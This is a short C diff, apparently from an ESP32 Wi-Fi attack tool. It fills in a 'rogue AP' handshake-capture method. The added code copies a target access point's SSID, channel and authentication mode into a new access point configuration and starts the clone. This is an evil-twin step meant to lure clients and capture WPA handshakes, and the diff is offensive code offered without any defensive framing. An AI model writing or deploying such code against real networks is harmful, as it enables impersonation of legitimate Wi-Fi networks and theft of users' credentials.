@@ -1,5 +1,6 @@
 #include "attack_handshake.h"
 
+#include <string.h>
 #define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
 #include "esp_log.h"
 #include "esp_err.h"
@@ -38,7 +39,18 @@ static void attack_handshake_method_broadcast(){
 }
 
 static void attack_handshake_method_rogueap(){
-    ESP_LOGD(TAG, "ROGUE AP method placeholder");
+    ESP_LOGD(TAG, "Configuring Rogue AP");
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid_len = strlen((char *)ap_record->ssid),
+            .channel = ap_record->primary,
+            .authmode = ap_record->authmode,
+            .password = "dummypassword",
+            .max_connection = 0
+        },
+    };
+    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
+    wifictl_ap_start(&ap_config);
 }
 
 void attack_handshake_start(attack_config_t *attack_config){
